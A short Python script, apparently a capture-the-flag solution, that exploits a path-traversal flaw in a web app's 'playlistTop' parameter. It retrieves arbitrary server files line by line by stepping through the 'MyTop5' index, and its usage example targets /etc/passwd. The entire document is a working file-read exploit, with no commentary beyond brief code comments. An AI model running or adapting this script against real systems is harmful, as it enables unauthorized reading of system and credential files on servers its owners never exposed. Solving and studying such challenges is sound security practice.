import requests
import os
import sys

MAX_CONSEC_EMPTY_LINES = 100
URL = "challs.dvc.tf:51080"

def main(file_name):
    
    file_contents = ""

    res = requests.get(
        f"http://{URL}/?MyTop5=26&playlistTop=../../../../../..{file_name}"
    )

    if "Permission denied" in res.text:
        print(f"(+) Permission denied: {file_name}")
        sys.exit(0)
    elif "No such file" in res.text:
        print(f"(+) No such file: {file_name}")
        sys.exit(0)

    consec_empty_lines = 0
    for i in range(1, 99999):
        res = requests.get(
            f"http://{URL}/?MyTop5={i}&playlistTop=../../../../../..{file_name}"
        )
        
        offset = res.text.find("http://www.youtube.com/embed/")
        if 'width' in res.text[offset:].split('\n')[0]:
            # means no more file content
            if consec_empty_lines >= MAX_CONSEC_EMPTY_LINES:
                break
            else:
                consec_empty_lines += 1
                continue
        else:
            text = res.text[offset:].split('\n')[0][29:]
            file_contents += text + '\n'
            consec_empty_lines = 0 # reset consec empty lines

    print(file_contents)

if len(sys.argv) < 2:
    print("Usage: (+) python3 get_file.py /etc/passwd")
else:
    main(sys.argv[1])
